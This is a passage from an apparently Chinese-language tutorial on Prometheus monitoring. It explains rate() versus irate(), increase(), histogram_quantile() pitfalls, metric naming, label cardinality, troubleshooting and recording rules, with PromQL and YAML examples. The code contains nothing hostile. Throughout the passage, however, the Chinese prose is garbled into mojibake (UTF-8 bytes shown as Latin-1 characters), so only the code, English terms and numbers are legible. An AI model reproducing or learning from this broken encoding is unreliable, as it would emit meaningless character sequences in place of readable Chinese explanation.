<li>æ§åˆ¶é«˜åŸºæ•°ï¼šé¿å…å­˜å‚¨çˆ†ç‚¸</li>
<li>_sum å’Œ _countï¼šç”¨ä¸¤ä¸ªé¢å¤–çš„ Counter å°±èƒ½ç®—å¹³å‡å€¼</li>
</ul>
<p>æ²¡æœ‰ä¸€ä¸ªè®¾è®¡æ˜¯å®Œç¾çš„ï¼Œä½† Histogram æ‰¾åˆ°äº†ä¸€ä¸ª"è¶³å¤Ÿå¥½"çš„å¹³è¡¡ç‚¹ï¼š</p>
<ul>
<li>ç‰ºç‰²ä¸€ç‚¹ç²¾ç¡®åº¦ï¼ˆä¸çŸ¥é“å‡†ç¡®è€—æ—¶ï¼‰</li>
<li>æ¢å–å­˜å‚¨æ•ˆç‡ï¼ˆå‹ç¼© 1000 å€ï¼‰</li>
<li>ä¿ç•™çµæ´»æ€§ï¼ˆå¯ä»¥ç®—ä»»æ„åˆ†ä½æ•°ï¼‰</li>
<li>æ”¯æŒèšåˆï¼ˆå¤šå®ä¾‹å¯ä»¥åˆå¹¶ï¼‰</li>
</ul>
<p>è¿™å°±æ˜¯"ç®€å•æ¨¡å‹"çš„åŠ›é‡ï¼šç”¨ç®€å•çš„è§„åˆ™ï¼ˆç´¯ç§¯çš„ bucketï¼‰ï¼Œè§£å†³å¤æ‚çš„é—®é¢˜ï¼ˆæ€§èƒ½åˆ†å¸ƒï¼‰ã€‚</p>
<hr/>
<h2 data-id="heading-14">4. æ˜“æ··æ·†æ¦‚å¿µï¼šç»†èŠ‚ä¸­çš„è®¾è®¡æ™ºæ…§</h2>
<h3 data-id="heading-15">4.1 rate() vs irate()</h3>
<p>è¿™æ˜¯æœ€å®¹æ˜“æ··æ·†çš„ä¸€å¯¹å‡½æ•°ã€‚</p>
<p><strong>è®¡ç®—æ–¹å¼çš„åŒºåˆ«</strong></p>
<pre><code class="hljs language-promql" lang="promql">rate(http_requests_total[5m])   # ç”¨ 5 åˆ†é’Ÿçª—å£å†…æ‰€æœ‰ç‚¹è®¡ç®—å¹³å‡é€Ÿç‡
irate(http_requests_total[5m])  # åªç”¨æœ€è¿‘ä¸¤ä¸ªç‚¹è®¡ç®—ç¬æ—¶é€Ÿç‡
</code></pre>
<p><strong>ä¸¾ä¸ªä¾‹å­</strong></p>
<p>å‡è®¾è¿‡å» 5 åˆ†é’Ÿçš„ Counter å€¼ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile">æ—¶é—´      å€¼
<span class="hljs-section">10:00    1000</span>
<span class="hljs-section">10:01    1100  (+100)</span>
<span class="hljs-section">10:02    1200  (+100)</span>
<span class="hljs-section">10:03    1300  (+100)</span>
<span class="hljs-section">10:04    1400  (+100)</span>
<span class="hljs-section">10:05    1600  (+200)  â† æœ€å 1 åˆ†é’Ÿå¢åŠ äº† 200</span>
</code></pre>
<p><code>rate()</code> çš„è®¡ç®—ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">æ€»å¢é‡ = 1600 - <span class="hljs-attr">1000</span> = <span class="hljs-number">600</span>
æ—¶é—´è·¨åº¦ = 5 åˆ†é’Ÿ = 300 ç§’
<span class="hljs-attr">rate</span> = <span class="hljs-number">600</span> / <span class="hljs-number">300</span> = <span class="hljs-number">2.0</span>/s
</code></pre>
<p><code>irate()</code> çš„è®¡ç®—ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">æœ€è¿‘ä¸¤ä¸ªç‚¹çš„å¢é‡ = 1600 - <span class="hljs-attr">1400</span> = <span class="hljs-number">200</span>
æ—¶é—´é—´éš” = 60 ç§’
<span class="hljs-attr">irate</span> = <span class="hljs-number">200</span> / <span class="hljs-number">60</span> = <span class="hljs-number">3.33</span>/s
</code></pre>
<p><strong>æ›²çº¿å¯¹æ¯”</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">rate():  å¹³æ»‘æ›²çº¿</span>
æ—¶é—´  å€¼
<span class="hljs-section">10:00  2.0</span>
<span class="hljs-section">10:01  2.0</span>
<span class="hljs-section">10:02  2.0</span>
<span class="hljs-section">10:03  2.0</span>
<span class="hljs-section">10:04  2.0</span>
<span class="hljs-section">10:05  2.0  â† ä»ç„¶æ˜¯å¹³å‡å€¼</span>

<span class="hljs-section">irate(): æ•æ„Ÿæ›²çº¿</span>
æ—¶é—´  å€¼
<span class="hljs-section">10:00  1.67</span>
<span class="hljs-section">10:01  1.67</span>
<span class="hljs-section">10:02  1.67</span>
<span class="hljs-section">10:03  1.67</span>
<span class="hljs-section">10:04  1.67</span>
<span class="hljs-section">10:05  3.33  â† ç«‹å³ååº”äº†çªå¢</span>
</code></pre>
<p><strong>ä½•æ—¶ç”¨å“ªä¸ªï¼Ÿ</strong></p>



































<table><thead><tr><th>åœºæ™¯</th><th>æ¨è</th><th>åŸå› </th></tr></thead><tbody><tr><td>å‘Šè­¦è§„åˆ™</td><td>rate()</td><td>é¿å…æ¯›åˆºå¯¼è‡´è¯¯æŠ¥</td></tr><tr><td>å®¹é‡è§„åˆ’</td><td>rate()</td><td>éœ€è¦é•¿æœŸè¶‹åŠ¿</td></tr><tr><td>å®æ—¶ç›‘æ§ Dashboard</td><td>irate()</td><td>å¿«é€Ÿååº”å˜åŒ–</td></tr><tr><td>SLO è®¡ç®—</td><td>rate()</td><td>éœ€è¦å¹³æ»‘æ•°æ®</td></tr><tr><td>è°ƒè¯•é—®é¢˜</td><td>irate()</td><td>éœ€è¦çœ‹ç¬æ—¶æƒ…å†µ</td></tr></tbody></table>
<p><strong>ä¸€ä¸ªå®æˆ˜å»ºè®®</strong></p>
<p>åœ¨ Grafana Dashboard ä¸Šï¼š</p>
<ul>
<li>æ¦‚è§ˆé¡µé¢ç”¨ <code>rate()</code>ï¼ˆçœ‹æ•´ä½“è¶‹åŠ¿ï¼‰</li>
<li>è¯¦æƒ…é¡µé¢ç”¨ <code>irate()</code>ï¼ˆçœ‹å®æ—¶æ³¢åŠ¨ï¼‰</li>
</ul>
<h3 data-id="heading-16">4.2 increase() vs rate()</h3>
<p><strong>å®šä¹‰</strong></p>
<pre><code class="hljs language-promql" lang="promql">increase(http_requests_total[1h])  # è¿”å› 1 å°æ—¶çš„å¢é‡ï¼ˆæ€»æ•°ï¼‰
rate(http_requests_total[1h])      # è¿”å›æ¯ç§’çš„é€Ÿç‡
</code></pre>
<p><strong>æ¢ç®—å…³ç³»</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">increase</span>(metric[<span class="hljs-number">1</span>h]) = <span class="hljs-built_in">rate</span>(metric[<span class="hljs-number">1</span>h]) Ã— <span class="hljs-number">3600</span>
</code></pre>
<p>å› ä¸º 1 å°æ—¶ = 3600 ç§’ã€‚</p>
<p><strong>å®é™…ä¾‹å­</strong></p>
<pre><code class="hljs language-promql" lang="promql">http_requests_total

æ—¶é—´    å€¼
09:00  1000
10:00  2000

increase(http_requests_total[1h]) = 2000 - 1000 = 1000
â†’ 1 å°æ—¶å¢åŠ äº† 1000 ä¸ªè¯·æ±‚

rate(http_requests_total[1h]) = (2000 - 1000) / 3600 = 0.278
â†’ å¹³å‡æ¯ç§’ 0.278 ä¸ªè¯·æ±‚
</code></pre>
<p><strong>ä»€ä¹ˆæ—¶å€™ç”¨å“ªä¸ªï¼Ÿ</strong></p>
<pre><code class="hljs language-promql" lang="promql"># ä½ æƒ³çŸ¥é“"1 å°æ—¶å†…æ€»å…±å¤„ç†äº†å¤šå°‘è¯·æ±‚"
increase(http_requests_total[1h])

# ä½ æƒ³çŸ¥é“"å¹³å‡æ¯ç§’å¤„ç†å¤šå°‘è¯·æ±‚"
rate(http_requests_total[1h])

# å‘Šè­¦ï¼šæ¯ç§’è¯·æ±‚è¶…è¿‡ 100
rate(http_requests_total[5m]) &gt; 100

# å‘Šè­¦ï¼š1 å°æ—¶å†…é”™è¯¯è¶…è¿‡ 1000 ä¸ª
increase(error_total[1h]) &gt; 1000
</code></pre>
<h3 data-id="heading-17">4.3 histogram_quantile() çš„å¸¸è§è¯¯åŒº</h3>
<p><strong>è¯¯åŒº 1ï¼šä¸ç”¨ rate()</strong></p>
<pre><code class="hljs language-promql" lang="promql"># é”™è¯¯
histogram_quantile(0.95, http_request_duration_seconds_bucket)

# æ­£ç¡®
histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m]))
</code></pre>
<p>ä¸ºä»€ä¹ˆï¼Ÿå› ä¸º bucket æ˜¯ Counterï¼ˆç´¯ç§¯å€¼ï¼‰ï¼Œä½ éœ€è¦è½¬æˆé€Ÿç‡ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">bucket çš„åŸå§‹å€¼ï¼š
<span class="hljs-attr">le</span>=<span class="hljs-string">"0.1"</span>  <span class="hljs-number">1000</span>  â† ç´¯ç§¯æœ‰ <span class="hljs-number">1000</span> ä¸ª
<span class="hljs-attr">le</span>=<span class="hljs-string">"0.5"</span>  <span class="hljs-number">5000</span>  â† ç´¯ç§¯æœ‰ <span class="hljs-number">5000</span> ä¸ª

rate() åï¼š
<span class="hljs-attr">le</span>=<span class="hljs-string">"0.1"</span>  <span class="hljs-number">2.5</span>   â† æ¯ç§’ <span class="hljs-number">2.5</span> ä¸ª
<span class="hljs-attr">le</span>=<span class="hljs-string">"0.5"</span>  <span class="hljs-number">10</span>    â† æ¯ç§’ <span class="hljs-number">10</span> ä¸ª

histogram_quantile éœ€è¦"æ¯ç§’å¤šå°‘ä¸ª"æ‰èƒ½ç®—å¯¹
</code></pre>
<p><strong>è¯¯åŒº 2ï¼šä¸¢æ‰ le æ ‡ç­¾</strong></p>
<pre><code class="hljs language-promql" lang="promql"># é”™è¯¯ï¼šèšåˆæ—¶ä¸¢æ‰äº† le
histogram_quantile(0.95, 
  sum(rate(http_request_duration_seconds_bucket[5m]))
)

# æ­£ç¡®ï¼šby (le) ä¿ç•™ le æ ‡ç­¾
histogram_quantile(0.95, 
  sum(rate(http_request_duration_seconds_bucket[5m])) by (le)
)
</code></pre>
<p>ä¸ºä»€ä¹ˆï¼Ÿå› ä¸º <code>histogram_quantile()</code> éœ€è¦ <code>le</code> æ ‡ç­¾æ¥çŸ¥é“æ¯ä¸ª bucket çš„è¾¹ç•Œã€‚</p>
<p><strong>è¯¯åŒº 3ï¼šå¯¹é bucket æŒ‡æ ‡ä½¿ç”¨</strong></p>
<pre><code class="hljs language-promql" lang="promql"># é”™è¯¯ï¼šè¿™ä¸æ˜¯ histogram
histogram_quantile(0.95, http_requests_total)

# histogram_quantile åªèƒ½ç”¨äº _bucket æŒ‡æ ‡
</code></pre>
<h3 data-id="heading-18">4.4 sum() vs avg() vs rate()</h3>
<p>è¿™ä¸‰ä¸ªå‡½æ•°ç»å¸¸ä¸€èµ·ç”¨ï¼Œå®¹æ˜“æ··æ·†ã€‚</p>
<p><strong>sum() - æ±‚å’Œ</strong></p>
<pre><code class="hljs language-promql" lang="promql"># æŠŠæ‰€æœ‰å®ä¾‹çš„è¯·æ±‚æ•°åŠ èµ·æ¥
sum(rate(http_requests_total[5m]))
</code></pre>
<p><strong>avg() - æ±‚å¹³å‡</strong></p>
<pre><code class="hljs language-promql" lang="promql"># è®¡ç®—æ‰€æœ‰å®ä¾‹çš„å¹³å‡è¯·æ±‚é€Ÿç‡
avg(rate(http_requests_total[5m]))
</code></pre>
<p><strong>åŒºåˆ«</strong></p>
<pre><code class="hljs language-bash" lang="bash">åœºæ™¯ï¼š3 ä¸ªå®ä¾‹

å®ä¾‹ 1: 100 req/s
å®ä¾‹ 2: 200 req/s
å®ä¾‹ 3: 300 req/s

<span class="hljs-built_in">sum</span>() = 100 + 200 + 300 = 600 req/s  â† æ€»è¯·æ±‚é€Ÿç‡
avg() = (100 + 200 + 300) / 3 = 200 req/s  â† å¹³å‡æ¯ä¸ªå®ä¾‹çš„é€Ÿç‡
</code></pre>
<p><strong>ä»€ä¹ˆæ—¶å€™ç”¨å“ªä¸ªï¼Ÿ</strong></p>
<pre><code class="hljs language-promql" lang="promql"># ä½ æƒ³çŸ¥é“"æ•´ä¸ªé›†ç¾¤æ¯ç§’å¤„ç†å¤šå°‘è¯·æ±‚"
sum(rate(http_requests_total[5m]))

# ä½ æƒ³çŸ¥é“"å¹³å‡æ¯ä¸ªå®ä¾‹æ¯ç§’å¤„ç†å¤šå°‘è¯·æ±‚"
avg(rate(http_requests_total[5m]))
</code></pre>
<hr/>
<h2 data-id="heading-19">5. ç”Ÿäº§ç¯å¢ƒçš„å®æˆ˜ç»éªŒ</h2>
<h3 data-id="heading-20">5.1 æŒ‡æ ‡å‘½åè§„èŒƒ</h3>
<p><strong>åŸºæœ¬æ ¼å¼</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">namespace</span>&gt;</span>_<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>_<span class="hljs-tag">&lt;<span class="hljs-name">unit</span>&gt;</span>_<span class="hljs-tag">&lt;<span class="hljs-name">suffix</span>&gt;</span>
</code></pre>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">node_memory_MemAvailable_bytes     <span class="hljs-comment"># æœåŠ¡å™¨å†…å­˜</span>
http_requests_total                <span class="hljs-comment"># HTTP è¯·æ±‚</span>
http_request_duration_seconds      <span class="hljs-comment"># HTTP è€—æ—¶</span>
mysql_queries_total                <span class="hljs-comment"># MySQL æŸ¥è¯¢</span>
redis_memory_used_bytes            <span class="hljs-comment"># Redis å†…å­˜</span>
</code></pre>
<p><strong>è§„èŒƒç»†èŠ‚</strong></p>






























<table><thead><tr><th>éƒ¨åˆ†</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>namespace</td><td>æ‰€å±ç³»ç»Ÿ</td><td>node, http, mysql, redis</td></tr><tr><td>name</td><td>æŒ‡æ ‡å«ä¹‰</td><td>requests, queries, memory</td></tr><tr><td>unit</td><td>å•ä½</td><td>bytes, seconds, ratio</td></tr><tr><td>suffix</td><td>ç±»å‹åç¼€</td><td>_total, _bucket, _count</td></tr></tbody></table>
<p><strong>å•ä½è§„èŒƒ</strong></p>
<ul>
<li>æ—¶é—´ï¼š<code>_seconds</code>ï¼ˆä¸è¦ç”¨ ms æˆ– minutesï¼‰</li>
<li>å¤§å°ï¼š<code>_bytes</code>ï¼ˆä¸è¦ç”¨ KB æˆ– MBï¼‰</li>
<li>æ¯”ä¾‹ï¼š<code>_ratio</code>ï¼ˆ0-1ï¼‰æˆ– <code>_percent</code>ï¼ˆ0-100ï¼‰</li>
</ul>
<pre><code class="hljs language-promql" lang="promql"># å¥½
http_request_duration_seconds 0.234
memory_usage_bytes 8589934592
cpu_usage_ratio 0.85

# ä¸å¥½
http_request_duration_ms 234
memory_usage_mb 8192
cpu_usage_percent 85
</code></pre>
<p>ä¸ºä»€ä¹ˆç»Ÿä¸€ç”¨åŸºæœ¬å•ä½ï¼Ÿ</p>
<ol>
<li>é¿å…å•ä½æ¢ç®—é”™è¯¯</li>
<li>PromQL å¯ä»¥ç”¨ <code>* 1000</code> ç­‰è½¬æ¢æ˜¾ç¤º</li>
</ol>
<h3 data-id="heading-21">5.2 æ ‡ç­¾è®¾è®¡åŸåˆ™</h3>
<p><strong>åŸåˆ™ 1ï¼šä½åŸºæ•°</strong></p>
<pre><code class="hljs language-promql" lang="promql"># å¥½ï¼šä½åŸºæ•°æ ‡ç­¾
http_requests{method="GET", status="200"}  
â†’ method æœ‰ 5 ä¸ªå€¼ï¼ˆGET/POST/PUT/DELETE/PATCHï¼‰
â†’ status æœ‰ 10 ä¸ªå€¼ï¼ˆ200/404/500...ï¼‰
â†’ æ€»ç»„åˆ 5 Ã— 10 = 50

# åï¼šé«˜åŸºæ•°æ ‡ç­¾
http_requests{user_id="123456"}
â†’ user_id æœ‰ç™¾ä¸‡ä¸ªå€¼
â†’ ç™¾ä¸‡æ¡æ—¶é—´åºåˆ—
</code></pre>
<p><strong>åŸåˆ™ 2ï¼šæœ‰æ„ä¹‰</strong></p>
<pre><code class="hljs language-promql" lang="promql"># å¥½ï¼šæ ‡ç­¾æœ‰å®é™…å«ä¹‰
http_requests{service="api", path="/users"}

# åï¼šæ ‡ç­¾æ²¡ä»€ä¹ˆç”¨
http_requests{server_index="1", cluster_id="abc123"}
</code></pre>
<p><strong>åŸåˆ™ 3ï¼šè·¯å¾„æ¨¡æ¿åŒ–</strong></p>
<pre><code class="hljs language-promql" lang="promql"># åï¼šæ¯ä¸ªç”¨æˆ·ä¸€ä¸ªè·¯å¾„
http_duration{path="/api/users/123456"}
http_duration{path="/api/users/789012"}
...

# å¥½ï¼šç”¨æ¨¡æ¿
http_duration{path="/api/users/:id"}
</code></pre>
<p><strong>åŸåˆ™ 4ï¼šä¸è¦ç”¨æ ‡ç­¾å­˜æ•°å€¼</strong></p>
<pre><code class="hljs language-promql" lang="promql"># åï¼šæŠŠæ•°å€¼æ”¾æ ‡ç­¾é‡Œ
http_requests{duration="0.234"}

# å¥½ï¼šç”¨ä¸“é—¨çš„ Histogram æŒ‡æ ‡
http_request_duration_seconds_bucket{le="0.5"}
</code></pre>
<h3 data-id="heading-22">5.3 å¸¸è§çš„ç”Ÿäº§é—®é¢˜</h3>
<p><strong>é—®é¢˜ 1ï¼šCounter çªç„¶ä¸‹é™æ€ä¹ˆåŠï¼Ÿ</strong></p>
<p>ç°è±¡ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile">http_requests_total

<span class="hljs-section">10:00  1000</span>
<span class="hljs-section">10:01  1500</span>
<span class="hljs-section">10:02  500   â† çªç„¶ä¸‹é™äº†ï¼</span>
</code></pre>
<p>å¯èƒ½åŸå› ï¼š</p>
<ol>
<li>Pod/å®¹å™¨é‡å¯äº†ï¼ˆæ­£å¸¸ï¼‰</li>
<li>Prometheus æŠ“å–é”™è¯¯ï¼ˆé—®é¢˜ï¼‰</li>
<li>åº”ç”¨ bugï¼ˆé—®é¢˜ï¼‰</li>
</ol>
<p>æ’æŸ¥ï¼š</p>
<pre><code class="hljs language-promql" lang="promql"># çœ‹ up æŒ‡æ ‡ï¼Œç¡®è®¤æ˜¯å¦æŠ“å–æˆåŠŸ
up{job="my-app"}

# çœ‹æ˜¯å¦æœ‰é‡å¯
kube_pod_container_status_restarts_total
</code></pre>
<p><strong>é—®é¢˜ 2ï¼šHistogram çš„ P99 çªç„¶é£™å‡</strong></p>
<p>ç°è±¡ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">P50: 100msï¼ˆæ­£å¸¸ï¼‰</span>
<span class="hljs-section">P90: 200msï¼ˆæ­£å¸¸ï¼‰</span>
<span class="hljs-section">P99: 5000msï¼ˆå¼‚å¸¸ï¼ï¼‰</span>
</code></pre>
<p>è¿™è¯´æ˜æœ‰ 1% çš„è¯·æ±‚ç‰¹åˆ«æ…¢ï¼Œå¯èƒ½åŸå› ï¼š</p>
<ol>
<li>æ•°æ®åº“æ…¢æŸ¥è¯¢</li>
<li>ç¼“å­˜æœªå‘½ä¸­</li>
<li>GC åœé¡¿</li>
<li>ä¸‹æ¸¸æœåŠ¡è¶…æ—¶</li>
</ol>
<p>æ’æŸ¥ï¼š</p>
<pre><code class="hljs language-promql" lang="promql"># çœ‹æ…¢çš„æ˜¯å“ªä¸ªæ¥å£
topk(5,
  histogram_quantile(0.99, 
    rate(http_duration_bucket[5m])
  )
)

# å¯¹æ¯” P50 å’Œ P99 çš„å·®å¼‚
histogram_quantile(0.99, ...) 
/ 
histogram_quantile(0.5, ...)
# å¦‚æœæ¯”å€¼ &gt; 10ï¼Œè¯´æ˜æœ‰ä¸¥é‡é•¿å°¾
</code></pre>
<p><strong>é—®é¢˜ 3ï¼šæŒ‡æ ‡çªç„¶æ¶ˆå¤±</strong></p>
<p>ç°è±¡ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">http_requests_total{<span class="hljs-attr">service</span>=<span class="hljs-string">"api"</span>} 

10:00  æœ‰æ•°æ®
10:05  æ²¡æœ‰æ•°æ®äº†
</code></pre>
<p>å¯èƒ½åŸå› ï¼š</p>
<ol>
<li>æœåŠ¡æŒ‚äº†ï¼ˆ<code>up == 0</code>ï¼‰</li>
<li>æ ‡ç­¾å˜äº†ï¼ˆæ¯”å¦‚ service åç§°æ”¹äº†ï¼‰</li>
<li>æŒ‡æ ‡è¢«åˆ é™¤äº†</li>
</ol>
<p>æ’æŸ¥ï¼š</p>
<pre><code class="hljs language-promql" lang="promql"># çœ‹æœåŠ¡æ˜¯å¦å­˜æ´»
up{job="my-app"}

# çœ‹æ‰€æœ‰ http_requests_total æŒ‡æ ‡ï¼ˆä¸é™åˆ¶æ ‡ç­¾ï¼‰
http_requests_total

# çœ‹æœ€è¿‘æ–°å‡ºç°çš„æ—¶é—´åºåˆ—
time() - timestamp(http_requests_total) &lt; 300
</code></pre>
<h3 data-id="heading-23">5.4 æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h3>
<p><strong>æŠ€å·§ 1ï¼šç”¨ Recording Rules é¢„è®¡ç®—</strong></p>
<p>å¦‚æœä¸€ä¸ªæŸ¥è¯¢å¾ˆå¤æ‚ï¼Œç»å¸¸ç”¨åˆ°ï¼Œå¯ä»¥ç”¨ Recording Rule é¢„å…ˆè®¡ç®—ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">groups:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">api_rules</span>
    <span class="hljs-attr">interval:</span> <span class="hljs-string">30s</span>
    <span class="hljs-attr">rules:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">record:</span> <span class="hljs-string">job:http_requests:rate5m</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">sum(rate(http_requests_total[5m]))</span> <span class="hljs-string">by</span> <span class="hljs-string">(job)</span>
      
      <span class="hljs-bullet">-</span> <span class="hljs-attr">record:</span> <span class="hljs-string">job:http_p95_seconds</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">histogram_quantile(0.95,</span> 
                <span class="hljs-string">sum(rate(http_duration_bucket[5m]))</span> <span class="hljs-string">by</span> <span class="hljs-string">(job,</span> <span class="hljs-string">le)</span>
              <span class="hljs-string">)</span>
</code></pre>
<p>ç„¶åæŸ¥è¯¢æ—¶ç›´æ¥ç”¨ï¼š</p>
<pre><code class="hljs language-promql" lang="promql"># ä¸ç”¨æ¯æ¬¡éƒ½ç®— rate() å’Œ sum()
job:http_requests:rate5m

# ä¸ç”¨æ¯æ¬¡éƒ½ç®— histogram_quantile()
job:http_p95_seconds
</code></pre>
<p><strong>æŠ€å·§ 2ï¼šæ§åˆ¶æŒ‡æ ‡æ•°é‡</strong></p>
<pre><code class="hljs language-promql" lang="promql"># æŸ¥çœ‹æŒ‡æ ‡æ•°é‡
count(http_requests_total)

# æŸ¥çœ‹å“ªä¸ªæ ‡ç­¾åŸºæ•°æœ€é«˜
count by (service) (http_requests_total)
count by (path) (http_requests_total)
</code></pre>
<p>å¦‚æœæŸä¸ªæ ‡ç­¾åŸºæ•°å¤ªé«˜ï¼Œè€ƒè™‘ï¼š</p>
<ol>
<li>å»æ‰è¿™ä¸ªæ ‡ç­¾</li>
<li>åˆå¹¶æ ‡ç­¾å€¼ï¼ˆæ¯”å¦‚æŠŠæ‰€æœ‰ 5xx å½’ä¸ºä¸€ç±»ï¼‰</li>
<li>ç”¨è·¯å¾„æ¨¡æ¿</li>
</ol>
<p><strong>æŠ€å·§ 3ï¼šåˆç†è®¾ç½®æŠ“å–é—´éš”</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># prometheus.yml</span>
<span class="hljs-attr">scrape_configs:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">job_name:</span> <span class="hljs-string">'high-frequency'</span>
    <span class="hljs-attr">scrape_interval:</span> <span class="hljs-string">15s</span>  <span class="hljs-comment"># å˜åŒ–å¿«çš„æŒ‡æ ‡</span>
  
  <span class="hljs-bullet">-</span> <span class="hljs-attr">job_name:</span> <span class="hljs-string">'low-frequency'</span>
    <span class="hljs-attr">scrape_interval:</span> <span class="hljs-string">60s</span>  <span class="hljs-comment"># å˜åŒ–æ…¢çš„æŒ‡æ ‡</span>
</code></pre>
<p>æ²¡å¿…è¦æ‰€æœ‰æŒ‡æ ‡éƒ½ 15 ç§’æŠ“ä¸€æ¬¡ã€‚</p>
<p><strong>ç”Ÿäº§å®è·µçš„æ™ºæ…§</strong></p>
<p>ç”Ÿäº§ç¯å¢ƒçš„ç»éªŒå‘Šè¯‰æˆ‘ä»¬ï¼šç†è®ºå†å®Œç¾ï¼Œä¹Ÿè¦ç»å¾—èµ·å®æˆ˜æ£€éªŒã€‚</p>
<p>è¿™ä¸€ç« çš„æ‰€æœ‰ç»éªŒéƒ½æŒ‡å‘ä¸€ä¸ªåŸåˆ™ï¼š<strong>åœ¨ç†è®ºå’Œå®é™…ä¹‹é—´æ‰¾åˆ°å¹³è¡¡</strong>ã€‚</p>
<ul>
<li>å‘½åè§„èŒƒï¼šè®©äººä¸€çœ¼çœ‹æ‡‚ï¼Œè€Œä¸æ˜¯ç‚«æŠ€</li>
<li>æ ‡ç­¾è®¾è®¡ï¼šä½åŸºæ•°ä¼˜å…ˆï¼Œå®ç®€å‹¿ç¹</li>
<li>é—®é¢˜æ’æŸ¥ï¼šä»ç®€å•åˆ°å¤æ‚ï¼Œé€æ­¥ç¼©å°èŒƒå›´</li>
<li>æ€§èƒ½ä¼˜åŒ–ï¼šå…ˆç”¨ Recording Rules é¢„è®¡ç®—ï¼Œå†è€ƒè™‘å¤æ‚æ–¹æ¡ˆ</li>
</ul>
<p>è¿™äº›ç»éªŒçš„èƒŒåï¼Œè¿˜æ˜¯é‚£ä¸ªå“²å­¦ï¼š<strong>ç®€å•ä¼˜å…ˆï¼Œå¤Ÿç”¨å°±å¥½</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-24">6. ä¸‹ä¸€æ­¥ï¼šä»ç†è§£åˆ°å®è·µ</h2>
<p>é€šè¿‡è¿™ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬æ·±å…¥æ¢è®¨äº† Prometheus çš„è®¾è®¡å“²å­¦ï¼š</p>
<p><strong>ä¸€ç§å“²å­¦ï¼šç®€å•ä¼˜å…ˆ</strong></p>
<ul>
<li>ç‰ºç‰²ä¸€ç‚¹ç²¾ç¡®æ€§ï¼Œæ¢å–ç®€å•å’Œå¯é </li>
<li>æŠŠå¤æ‚æ€§ç•™åœ¨æœåŠ¡ç«¯ï¼Œè®©å®¢æˆ·ç«¯ç®€å•</li>
<li>åœ¨æ€§èƒ½ã€ç²¾åº¦ã€çµæ´»æ€§ä¹‹é—´æ‰¾å¹³è¡¡</li>
</ul>
<p><strong>å››ä¸ªæŒ‡æ ‡ï¼šç”¨æœ€å°‘çš„ç±»å‹æè¿°æœ€å¤šçš„åœºæ™¯</strong></p>
<ul>
<li>Counterï¼šåªå¢ä¸å‡çš„ç´¯ç§¯å™¨</li>
<li>Gaugeï¼šå¯å¢å¯å‡çš„å¿«ç…§</li>
<li>Histogramï¼šåˆ†å¸ƒçš„å‹ç¼©</li>
<li>Summaryï¼šé¢„è®¡ç®—çš„ç»“æœ</li>
</ul>
<p><strong>ä¸€ä¸ªæ¨¡å‹ï¼šå¦‚ä½•çœ‹é€å¤æ‚ç³»ç»Ÿ</strong></p>
<p>Prometheus ç”¨å››ç§ç®€å•çš„æŒ‡æ ‡ç±»å‹ï¼Œå°±èƒ½æè¿°ä¸–é—´æ‰€æœ‰ç›‘æ§åœºæ™¯ã€‚è¿™ä¸æ˜¯å·§åˆï¼Œè€Œæ˜¯æŠ“ä½äº†æœ¬è´¨ï¼š</p>
<ul>
<li>ç´¯ç§¯ï¼Ÿç”¨ Counter</li>
<li>çŠ¶æ€ï¼Ÿç”¨ Gauge</li>
<li>åˆ†å¸ƒï¼Ÿç”¨ Histogram</li>
<li>æ€§èƒ½ï¼Ÿç”¨ Summary</li>
</ul>
<p>è¿™å°±æ˜¯"ç”¨ç®€å•æ¨¡å‹çœ‹é€å¤æ‚ç³»ç»Ÿ"çš„æ™ºæ…§ã€‚</p>
<hr/>
<p>ä½†ç†è§£å“²å­¦åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œæ¥ä¸‹æ¥ä½ éœ€è¦çŸ¥é“ï¼š</p>
<p><strong>å¦‚ä½•è®¾è®¡ä¸€ä¸ª Exporterï¼Ÿ</strong></p>
<ul>
<li>node-exporter æ˜¯æ€ä¹ˆè®¾è®¡çš„ï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆ CPU æ—¶é—´ç”¨ Counterï¼ŒCPU ä½¿ç”¨ç‡ç”¨ Gaugeï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆæŸäº›æŒ‡æ ‡è¦é¢„èšåˆï¼Ÿ</li>
</ul>
<p><strong>å¦‚ä½•åœ¨ Grafana ä¸­æ„å»ºå¤æ‚è¡¨è¾¾å¼ï¼Ÿ</strong></p>
<ul>
<li>å¦‚ä½•è®¡ç®— CPU ä½¿ç”¨ç‡ï¼Ÿ</li>
<li>å¦‚ä½•è®¡ç®—å†…å­˜å¯ç”¨ç‡ï¼Ÿ</li>
<li>å¦‚ä½•é¢„æµ‹ç£ç›˜ä½•æ—¶æ»¡ï¼Ÿ</li>
</ul>
<p><strong>å¦‚ä½•å¼€å‘è‡ªå®šä¹‰ Exporterï¼Ÿ</strong></p>
<ul>
<li>ç›‘æ§æ•°æ®åº“åº”è¯¥å…³æ³¨å“ªäº›æŒ‡æ ‡ï¼Ÿ</li>
<li>å¦‚ä½•é€‰æ‹©åˆé€‚çš„ç±»å‹ï¼Ÿ</li>
